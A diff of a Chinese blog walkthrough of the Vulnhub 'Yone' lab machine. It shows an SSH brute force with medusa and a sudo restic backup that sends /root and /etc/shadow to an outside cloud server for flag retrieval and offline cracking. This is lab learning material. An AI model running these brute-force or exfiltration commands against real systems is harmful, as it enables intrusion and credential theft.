@@ -1,7 +1,7 @@
 ---
 title: Yone
-published: 2026-08-17
-description: 对 Vulnhub 平台 [靶机名称] 靶机的完整渗透测试记录，涵盖信息收集、漏洞利用与提权全过程。
+published: 2026-08-19
+description: 对 Vulnhub 靶机 Yone 的完整渗透测试记录，涵盖从信息收集到获取 root 权限的完整过程。
 image: ./images/Pasted image 20260817205019.png
 tags:
   - Vulnhub
@@ -21,7 +21,7 @@ comment: true
 | **靶机名称**       | Yone: 1                                                                 |
 | **难度等级**       | Medium（中等）                                                              |
 | **目标**         | 获取 root 权限并找到 `/root` 目录下的 flag                                         |
-| **下载链接**       | [Yone.ova (1.7 GB)](https://www.vulnhub.com/entry/yone-1,543/#download) |
+| **下载链接**       | https://www.vulnhub.com/entry/yone-1,543/#download|
 | **攻击机 (Kali)** | `192.168.197.10`（建议使用 NAT 模式）                                           |
 | **靶机 (Yone)**  | `192.168.197.172`（DHCP 自动分配）                                            |
 ## 一、 信息收集 (Reconnaissance)
@@ -126,9 +126,8 @@ medusa -u yone -P /root/字典/rockyou_2025_00.txt -h 192.168.197.172 -M ssh -F 
 - `-t 10`：指定线程数为 10。
 ![](images/Pasted%20image%2020260818170725.png)
 ![](images/Pasted%20image%2020260818170445.png)
-**爆破结果**：
-> 用户名：`yone`
-> 密码：`12345qwert`
+
+**爆破结果**：用户名`yone`，密码`12345qwert`。
 
 ### 3.2 连接 SSH
 使用获取到的凭据成功登录 SSH。
@@ -145,7 +144,7 @@ uid=1000(yone) gid=1000(yone) groups=1000(yone)
 
 现在的目标是从普通用户 `yone` 提权至 `root`。
 ### 4.1 检查 Sudo 权限
-输入 `sudo -l` 查看当前用户能以 root 权限执行哪些命令，且无需密码。
+输入 `sudo -l` 查看当前用户能以 root 权限执行哪些命令，且无需root密码（只需要当前用户的密码）。
 
 ```bash
 sudo -l
@@ -165,7 +164,7 @@ sudo -l
 
 > ⚠️ **网络注意**：由于靶机和攻击机在同一内网，靶机可以主动连接公网，但**不能主动连接内网**，因此反弹 Shell 会失败。所以需要在**公网云服务器**上搭建 `restic` 服务端进行监听，而非在本地 Kali 上。
 
-
+我使用阿里云服务器，购买成功之后，安装 Golang 和 Restic，然后启动 Restic 服务。
 ```bash
 # 安装 Golang 和 Restic
 apt install -y golang restic
@@ -182,7 +181,7 @@ CGO_ENABLED=0 go build -o rest-server ./cmd/rest-server
 默认监听端口为 8000。
 ![](images/Pasted%20image%2020260819125152.png)
 #### 步骤 2：在靶机上初始化备份仓库
-在靶机 (`yone`) 上，使用 `restic` 客户端初始化一个指向我们服务器的仓库，并设置密码。
+在靶机 (`yone`) 上，使用 `restic` 客户端初始化一个指向我的服务器的仓库，并设置密码。
 
 ```bash
 restic -r rest:http://47.122.104.169:8000/rest1 init
@@ -190,12 +189,11 @@ restic -r rest:http://47.122.104.169:8000/rest1 init
 此处密码设置为 `123456`。
 ![](images/Pasted%20image%2020260819130021.png)
 #### 步骤 3：以 Root 权限备份敏感文件
-现在，使用 `sudo` 以 root 权限执行 `restic backup` 命令，将 `/root` 目录备份到我们的服务器。
+现在，使用 `sudo` 以 root 权限执行 `restic backup` 命令，将 `/root` 目录备份到我的服务器。
 
 ```bash
 sudo /usr/bin/restic backup -r rest:http://47.122.104.169:8000/rest1 /root
 ```
-或者，也可以选择备份 `/etc/shadow` 文件进行离线破解。
 ![](images/Pasted%20image%2020260819130647.png)
 ### 4.3 获取 Flag
 在攻击机的 Restic 服务器上，可以通过 `restic` 命令查看并恢复备份文件，从而获取 flag。
@@ -254,7 +252,7 @@ unmounting /mnt/restic...
 sudo /usr/bin/restic backup -r rest:http://47.122.104.169:8000/rest1 /etc/shadow
 ```
 ![](images/Pasted%20image%2020260819133002.png)
-备份完成后，此时 `rest1` 仓库中包含两个快照：`/root` 和 `/etc/shadow`。在云服务器上查看所有快照，记下备份 `shadow` 的快照 ID：
+备份完成后，此时 `rest1` 仓库中包含两个快照：`/root` 和 `/etc/shadow`。在云服务器上查看所有快照，记下备份 `shadow` 的快照 ID（fb1de187）：
 ```bash
 restic -r rest:http://47.122.104.169:8000/rest1 snapshots
 ```
